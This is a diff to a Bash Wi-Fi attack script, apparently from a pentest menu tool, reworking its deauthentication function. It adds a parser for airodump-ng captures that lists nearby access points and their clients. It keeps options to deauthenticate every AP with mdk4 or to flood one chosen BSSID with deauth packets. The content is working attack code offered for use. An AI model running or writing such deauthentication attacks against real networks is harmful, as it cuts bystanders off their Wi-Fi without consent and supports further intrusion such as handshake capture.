@@ -18,6 +18,8 @@ Cafe="\033[0;33m"
 blue="\033[1;34m"
 transparent="\e[0m"
 
+#Resources
+DIRECTORY=`mktemp -d`
 
 if [[ $EUID > 0 ]]; then # we can compare directly with this syntax.
   echo                -e "$white""##################################################################"
@@ -118,7 +120,7 @@ function internet_movil(){
 
 #################################################################################################
 #																								#
-#												WIFI DEAUTH 									#
+#		WIFI DEAUTH 									#
 #																								#
 #################################################################################################
 
@@ -133,26 +135,74 @@ function deauth(){
   airmon-ng check kill &> /dev/null 
   airmon-ng start $interface &> /dev/null 
   clear
-  echo "Scanning all Networks, press any key to continue..."
-  read tecla
-  echo "To break scan press CTRL + C"
-  sleep 2
-  clear
-  airodump-ng $MON
+  
   #Select attack
+  echo -e "$yellow"
+  banner
   echo ""
-  echo -e "$yellow""1- Deauth all AP"
-  echo -e "$yellow""2- Deauth only one AP"
+  echo ""
+  echo -e "$yellow""[1] - Deauth all AP"
+  echo -e "$yellow""[2] - Deauth only one AP"
   echo ""
   echo -ne "$blue"">> "
   read deauth
 
   if [ "$deauth" = "1" ];then
+  echo "To break attack press CTRL + C"
   xterm -hold -T "Close windows to stop attack" -e mdk4 $MON d;echo -e "$yellow""Attack succesfully...";sleep 1;echo "Shutdowing monitor mode";airmon-ng stop $MON &> /dev/null ; echo "Restarting Networks services";service NetworkManager restart
 
   fi
 
   if [ "$deauth" = "2" ];then
+  echo "To break scan press CTRL + C"
+  echo "press any key to continue..."
+  read tecla
+  sleep 2
+  clear
+  
+  #airodump-ng $MON
+  xterm -hold -T "Close windows to stop scan" -geometry 100x30+0+0 -e airodump-ng -a $MON -w $DIRECTORY/wdfk --ignore-negative-one
+  echo ""
+  
+  #Organize data
+  lines=`cat $DIRECTORY/wdfk-01.csv | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
+  lines=`expr $lines - 1`
+  head -n $lines $DIRECTORY/wdfk-01.csv &> $DIRECTORY/dump-02.csv
+  tail -n +$lines $DIRECTORY/wdfk-01.csv &> $DIRECTORY/clientes.csv
+  echo "                        WIFI LIST "
+  echo ""
+  echo " ID      MAC                      CHAN    SECU     PWR   ESSID"
+  echo ""
+  i=0
+
+  while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
+          longueur=${#MAC}
+          PRIVACY=$(echo $PRIVACY| tr -d "^ ")
+          PRIVACY=${PRIVACY:0:4}
+          if [ $longueur -ge 17 ]; then
+                  i=$(($i+1))
+                  POWER=`expr $POWER + 100`
+                  CLIENTE=`cat $DIRECTORY/clientes.csv | grep $MAC`
+
+                  if [ "$CLIENTE" != "" ]; then
+                          CLIENTE="*"
+                  echo -e " "$red"["$yellow"$i"$red"]"$green"$CLIENTE\t""$red"$MAC"\t""$red "$CHANNEL"\t""$green" $PRIVACY"\t  ""$red"$POWER%"\t""$red "$ESSID""$transparent""
+
+                  else
+
+                  echo -e " "$red"["$yellow"$i"$red"]"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$blue" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""
+
+                  fi
+
+                  aidlength=$IDLENGTH
+                  assid[$i]=$ESSID
+                  achannel[$i]=$CHANNEL
+                  amac[$i]=$MAC
+                  aprivacy[$i]=$PRIVACY
+                  aspeed[$i]=$SPEED
+          fi
+  done < $DIRECTORY/dump-02.csv
+  
   echo ""
   echo -ne "$yellow""AP BSSID: ""$transparent"
   read BSSID
@@ -165,7 +215,8 @@ function deauth(){
   sleep 2
   clear
   #Specific scan
-  airodump-ng $MON --bssid $BSSID --channel $CH
+  airodump-ng $MON --bssid $BSSID --channel $CH -a
+  echo ""
   echo -ne "$yellow""Deauth Packets(0 to infinite): "
   read deauth
   clear
@@ -175,6 +226,7 @@ function deauth(){
   fi
 
 }
+
 
 #################################################################################################
 #																							                                                	#
